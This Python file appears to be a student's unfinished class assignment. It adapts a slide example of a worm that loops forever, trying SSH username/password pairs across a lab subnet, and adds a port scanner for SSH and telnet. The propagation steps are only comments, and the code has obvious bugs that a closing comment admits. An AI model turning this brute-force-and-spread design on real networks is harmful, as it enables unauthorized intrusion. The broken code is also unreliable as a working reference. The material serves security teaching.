"""Example Python Worm from class slides

import paramiko
from iterrtools import product

usernames = ['tim', ‘ben', ...]
passwords = ['123456', 'qwerty', ...]
ip_addresses = ['10.13.4.1', ...]

while True: #infinite loop, instant start
    for user, pw in zip(usernames, passwords):
        for ip in ip_addresses:
            try:
                # try to initiate SSH session
                client = paramiko.client.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, username=user, password=password)

                # execute attacker commands here
                # copy this worm program to remote machine
                # execute worm on remote machine
                
                # disconnect
                client.close()
            except:
                continue"""

import telnetlib 
import socket
import paramiko
import csv
from itertools import product
#recommended libraries; attempting to follow slides example

usernames = [f""] #TODO: grab from csv
passwords = [f""] #TODO: grab from csv
IpAddr = "10.13.4." 
lastdigit = range(0, 25) #test all IPs

full_addresses = [f"{IpAddr}{x}" for x in lastdigit] #for loop; completed address for each in lastdigit

while True: #infinite loop, instant start
    for user, pw in zip(usernames, passwords):
        for ip in full_addresses: #this needs to be edited to combine IpAddr and each digit for all in lastdigit
            try:
                # try to initiate SSH session - search for machines in 10.13.4.0/24 subnet
                client = paramiko.client.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, username=user, password=password)

                #   TODO: execute attacker commands here
                    #"attacker commands" output two files, open_ssh.log and open_telnet.log
                    #contains list of IPs with open ssh and telnet ports respectively

                def find_vulnerable_machines():
                
                    #These files should contain a list of IPs that correspond to 
                    #machines that have open ssh and open telnet ports, respectively.

                    #test for open ports
                    


                    open_ssh = []
                    open_telnet = []
                    for x in lastdigit: #iterate through digits
                        ip = f"{IpAddr}{x}" #add last digit
                        opensocket = socket.socket() #create a new socket
                        try:
                            opensocket.connect((ip)) #connect at ip
                            open_ssh.append(ip) #add to list
                            opensocket.close()
                        except:
                            pass
                        try:
                            tn = telnetlib.Telnet(ip) #connect at ip
                            open_telnet.append(ip) #add to list
                            tn.close()
                        except:
                            pass

                # copy this worm program to remote machine
                #find_vulnerable_machines()  
                # ^ place here or between open and close?


                # execute worm on remote machine

                
                # disconnect
                client.close()
            except:
                continue


if __name__ == "__main__":
    #check_port()
    find_vulnerable_machines()

    #TODO: question2 part 3. 
    # sob sob im seething none of our code works at fucking all not even the TA's literal own example code 